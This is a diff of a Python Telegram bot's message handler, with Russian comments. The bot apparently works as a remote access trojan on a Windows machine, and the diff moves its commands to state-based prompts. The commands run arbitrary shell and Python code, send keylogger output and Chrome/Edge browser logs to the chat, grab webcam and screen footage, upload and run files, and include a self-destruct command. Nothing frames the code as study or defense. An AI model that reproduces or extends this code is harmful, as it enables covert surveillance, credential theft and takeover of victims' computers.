@@ -1,47 +1,13 @@
-import re
 import logging
 from commands import *
 from aiogram import Bot
 import asyncio
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.types import Message, FSInputFile, CallbackQuery
-
-HOTKEY_PAGES = [
-    [
-        ("Ctrl+C", "ctrl+c"),
-        ("Ctrl+V", "ctrl+v"),
-        ("Ctrl+X", "ctrl+x"),
-        ("Ctrl+Z", "ctrl+z"),
-        ("Ctrl+A", "ctrl+a"),
-        ("Ctrl+S", "ctrl+s"),
-        ("Alt+Tab", "alt+tab"),
-        ("Alt+F4", "alt+f4"),
-        ("Next ➡️", "page_1")
-    ],
-    [
-        ("Win", "win"),
-        ("Win+E", "win+e"),
-        ("Win+D", "win+d"),
-        ("Win+L", "win+l"),
-        ("Win+V", "win+v"),
-        ("Tab", "tab"),
-        ("Enter", "enter"),
-        ("⬅️ Back", "page_0"),
-        ("Next ➡️", "page_2")
-    ],
-    [
-        ("Ctrl+T", "ctrl+t"),
-        ("Ctrl+W", "ctrl+w"),
-        ("Ctrl+Shift+T", "ctrl+shift+t"),
-        ("Ctrl+L", "ctrl+l"),
-        ("F5", "f5"),
-        ("Ctrl+F", "ctrl+f"),
-        ("Backspace", "backspace"),
-        ("Esc", "esc"),
-        ("Space", "space"),
-        ("⬅️ Back", "page_1")
-    ]
-]
+from aiogram.fsm.context import FSMContext
+from states import *
+from state_handlers import handle_states
+from utils import send_safe_message, send_safe_document, send_file_and_cleanup
 
 
 def build_keyboard(page_number=0):
@@ -51,37 +17,9 @@ def build_keyboard(page_number=0):
     return InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
 
 
-async def send_safe_message(bot: Bot, chat_id, message):
-    while True:
-        try:
-            await bot.send_message(chat_id, message)
-            break
-        except:
-            await asyncio.sleep(1)
-
-
-async def send_safe_document(bot: Bot, chat_id, file_path):
-    """Безопасная отправка документа с повторными попытками"""
-    while True:
-        try:
-            await bot.send_document(chat_id, FSInputFile(file_path))
-            break
-        except:
-            await asyncio.sleep(1)
-
-
-async def send_file_and_cleanup(bot: Bot, chat_id, file_path, response_text=None):
-    """Отправляет файл, удаляет его и возвращает текст ответа"""
-    await send_safe_document(bot, chat_id, file_path)
-    os.remove(file_path)
-    return response_text
-
-
 async def handle_hotkey_callback(callback: CallbackQuery, bot: Bot):
-    """Обрабатывает нажатия на кнопки горячих клавиш"""
     data = callback.data
 
-    # Переход по страницам
     if data.startswith("page_"):
         page_number = int(data.split("_")[1])
         await callback.message.edit_text(
@@ -93,11 +31,9 @@ async def handle_hotkey_callback(callback: CallbackQuery, bot: Bot):
         await callback.answer()
         return
 
-    # Выполнение горячей клавиши
     try:
         result = execute_hotkey(data)
         await callback.answer(result, show_alert=False)
-
         await callback.message.edit_text(
             f"🖥️ <b>Горячие клавиши Windows</b>\n\n"
             f"✅ Выполнено: <code>{data}</code>\n\n"
@@ -109,13 +45,27 @@ async def handle_hotkey_callback(callback: CallbackQuery, bot: Bot):
         await callback.answer(f"❌ Ошибка: {e}", show_alert=True)
 
 
-async def handle_message(message: Message, bot: Bot):
+async def handle_message(message: Message, bot: Bot, state: FSMContext):
     chat_id = message.chat.id
     if not checkchat_id(str(chat_id)):
         return
 
+    # Проверяем состояние перед обработкой файлов
+    current_state = await state.get_state()
+
+    # Обработка документов
     if message.document:
         try:
+            if current_state == DownloadFile.waiting_for_file.state:
+                file_id = message.document.file_id
+                file_name = message.document.file_name
+                save_path = os.path.join(SCRIPTS_DIR, file_name)
+                file = await bot.get_file(file_id)
+                await bot.download_file(file.file_path, save_path)
+                await bot.send_message(chat_id, f"✅ Файл {file_name} успешно сохранён в {save_path}")
+                await state.clear()
+                return
+
             file_id = message.document.file_id
             file_name = message.document.file_name
             save_path = os.path.join(SCRIPTS_DIR, file_name)
@@ -127,18 +77,19 @@ async def handle_message(message: Message, bot: Bot):
             await bot.send_message(chat_id, f"Ошибка: {e}")
         return
 
+    # Обработка фото
     if message.photo:
         try:
-            photo = message.photo[-1]
-            file_id = photo.file_id
-
-            file_name = f"CLICK.png"
-            save_path = os.path.join(SCRIPTS_DIR, file_name)
-
-            file = await bot.get_file(file_id)
-            await bot.download_file(file.file_path, save_path)
-            await bot.send_message(chat_id, f"✅ Фото сохранено как {file_name} в папку {SCRIPTS_DIR}")
-
+            if current_state == ClickImage.waiting_for_photo.state:
+                photo = message.photo[-1]
+                file_id = photo.file_id
+                save_path = os.path.join(SCRIPTS_DIR, 'CLICK.png')
+                file = await bot.get_file(file_id)
+                await bot.download_file(file.file_path, save_path)
+                result = click_image()
+                await bot.send_message(chat_id, result)
+                await state.clear()
+                return
         except Exception as e:
             logging.error(f"Ошибка скачивания фото: {e}")
             await bot.send_message(chat_id, f"❌ Ошибка сохранения фото: {e}")
@@ -150,12 +101,19 @@ async def handle_message(message: Message, bot: Bot):
     command = message.text.strip()
     response = ''
 
+    # Обработка состояний
+    state_handled = await handle_states(message, bot, state, command)
+    if state_handled:
+        return
+
+    # Обычные команды
     try:
         if command == '/start':
             response = get_start_message()
 
         elif command == '/click_image':
-            response = click_image()
+            await state.set_state(ClickImage.waiting_for_photo)
+            response = '🖼️ Отправьте фото с изображением, на которое нужно кликнуть:'
 
         elif command == '/ping':
             response = ping()
@@ -181,110 +139,78 @@ async def handle_message(message: Message, bot: Bot):
             await bot.send_location(chat_id, *info['location'])
             response = info['text']
 
-        elif command.startswith('/cmd_exec'):
-            result = execute_cmd(command.replace('/cmd_exec', ''))
-            temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
-            with open(temp_path, 'w', encoding='utf-8') as f:
-                f.write(result)
-            await send_file_and_cleanup(bot, chat_id, temp_path)
-            response = result[:700]
+        elif command == '/cmd_exec':
+            await state.set_state(CmdExec.waiting_for_command)
+            response = '💻 Введите команду для выполнения:'
 
-        elif command.startswith('/python_exec'):
-            code = command.replace('/python_exec', '').strip()
-            if not code:
-                response = 'Использование: /python_exec <код>'
-            else:
-                path, result = python_exec(code)
-                if path:
-                    await send_file_and_cleanup(bot, chat_id, path)
-                else:
-                    response = result
+        elif command == '/python_exec':
+            await state.set_state(PythonExec.waiting_for_code)
+            response = '🐍 Введите Python код для выполнения:'
 
         elif command == '/capture_pc':
             path, response = capture_pc()
             await send_file_and_cleanup(bot, chat_id, path)
+            response = None
 
-        elif command.startswith('/video_pc'):
-            parts = command.replace('/video_pc', '').strip()
-            seconds = min(int(parts) if parts else 30, 500)
-            path, response = record_screen(seconds)
-            await send_file_and_cleanup(bot, chat_id, path)
+        elif command == '/video_pc':
+            await state.set_state(VideoPc.waiting_for_seconds)
+            response = '🎥 На сколько секунд записать видео? (макс 500):'
 
         elif command == '/capture_webcam':
             path = capture_webcam()
             if path:
                 await send_file_and_cleanup(bot, chat_id, path)
             else:
-                response = 'Ошибка захвата с камеры'
+                response = '❌ Ошибка захвата с камеры'
 
-        elif command.startswith('/msg_box'):
-            msg = command.replace('/msg_box', '').strip()
-            response = msg_box(msg)
+        elif command == '/msg_box':
+            await state.set_state(MsgBox.waiting_for_text)
+            response = '💬 Введите текст сообщения:'
 
-        elif command.startswith('/message_write'):
-            match = re.search(r'^/message_write\s+"(.+)"$', command)
-            if match:
-                response = message_write(match.group(1))
-            else:
-                response = 'Использование: /message_write "ваш текст"'
+        elif command == '/message_write':
+            await state.set_state(MessageWrite.waiting_for_text)
+            response = '✏️ Введите текст для ввода:'
 
-        elif command.startswith('/move_mouse_coord'):
-            parts = command.replace('/move_mouse_coord', '').strip().split()
-            if len(parts) == 2:
-                x, y = int(parts[0]), int(parts[1])
-                response = move_mouse_coord(x, y)
-            else:
-                response = 'Использование: /move_mouse_coord <x> <y>'
+        elif command == '/move_mouse_coord':
+            await state.set_state(MoveMouseCoord.waiting_for_coords)
+            response = '🎯 Введите координаты x y (например: 500 300):'
 
-        elif command.startswith('/move_mouse'):
-            parts = command.replace('/move_mouse', '').strip().split()
-            if len(parts) == 2:
-                direction, offset = parts
-                result = move_mouse_direction(direction.lower(), offset)
-                response = result if result else '❌ Направление должно быть: левее, правее, выше, ниже.'
-            else:
-                response = 'Использование: /move_mouse <направление> <пиксели>'
+        elif command == '/move_mouse':
+            await state.set_state(MoveMouseDirection.waiting_for_direction)
+            response = '🧭 Введите направление (левее/правее/выше/ниже):'
 
         elif command == '/click_left_mouse':
             response = click_left_mouse()
 
         elif command == '/click_right_mouse':
-            response = click_left_mouse()
+            response = click_right_mouse()
 
         elif command == '/double_click':
             response = double_click_left()
 
-        elif command.startswith('/download'):
-            path = command.replace('/download', '').strip()
-            file_path = download_file(path)
-            if file_path:
-                await send_safe_document(bot, chat_id, file_path)
-            else:
-                response = f'Файл не найден: {path}'
+        elif command == '/download':
+            await state.set_state(Download.waiting_for_path)
+            response = '📥 Введите путь к файлу на компьютере:'
 
-        elif command.startswith('/run'):
-            path = command.replace('/run', '').strip()
-            response = run_file(path)
+        elif command == '/download_file':
+            await state.set_state(DownloadFile.waiting_for_file)
+            response = '📁 Отправьте файл, который хотите сохранить на компьютере:'
 
-        elif command.startswith('/wallpaper'):
-            path = command.replace('/wallpaper', '').strip()
-            response = set_wallpaper(path)
+        elif command == '/run':
+            await state.set_state(Run.waiting_for_path)
+            response = '🚀 Введите путь к файлу для запуска:'
 
-        elif command.startswith('/ls'):
-            path = command.replace('/ls', '').strip()
-            response = list_directory(path)
+        elif command == '/wallpaper':
+            await state.set_state(Wallpaper.waiting_for_path)
+            response = '🖼️ Введите путь к файлу или URL картинки:'
 
-        elif command.startswith('/open_browser'):
-            parts = command.replace('/open_browser', '').strip().split(maxsplit=1)
+        elif command == '/ls':
+            await state.set_state(Ls.waiting_for_path)
+            response = '📁 Введите путь к папке (Enter - текущая):'
 
-            if len(parts) == 1:
-                url = parts[0]
-                response = open_browser(url)
-            elif len(parts) == 0:
-                response = open_browser()
-            else:
-                url = parts[0]
-                response = open_browser(url)
+        elif command == '/open_browser':
+            await state.set_state(OpenBrowser.waiting_for_url)
+            response = '🌐 Введите URL:'
 
         elif command == '/shutdown':
             response = shutdown()
@@ -295,16 +221,28 @@ async def handle_message(message: Message, bot: Bot):
         elif command == '/keylogs':
             await send_safe_document(bot, chat_id, KEYLOG_FILE)
             get_keylog_file()
+            response = None
 
         elif command == '/user_log':
             await send_safe_document(bot, chat_id, LOG_FILE)
             get_user_log_file()
+            response = None
 
         elif command == '/chrome_log':
-            response = get_browser_log(browser='chrome')
+            result = get_browser_log(browser='chrome')
+            if result and os.path.exists(result):
+                await send_safe_document(bot, chat_id, result)
+                os.remove(result)
+            else:
+                response = result
 
         elif command == '/edge_log':
-            response = get_browser_log(browser='edge')
+            result = get_browser_log(browser='edge')
+            if result and os.path.exists(result):
+                await send_safe_document(bot, chat_id, result)
+                os.remove(result)
+            else:
+                response = result
 
         elif command == '/self_destruct':
             response = confirm_self_destruct()
@@ -315,14 +253,15 @@ async def handle_message(message: Message, bot: Bot):
             await asyncio.sleep(1)
             os._exit(0)
 
-        elif command.startswith('/create_more_folders'):
-            parts = command.replace('/create_more_folders', '').strip().split()
-            if len(parts) >= 3:
-                response = create_desktop_folders(int(parts[0]), parts[1], parts[2])
+        elif command == '/create_more_folders':
+            await state.set_state(CreateMoreFolders.waiting_for_count)
+            response = '📂 Введите количество папок:'
 
     except Exception as e:
         response = f'⚠️ Ошибка: {e}'
 
     if response:
         await send_safe_message(bot, chat_id, response)
+
+
 
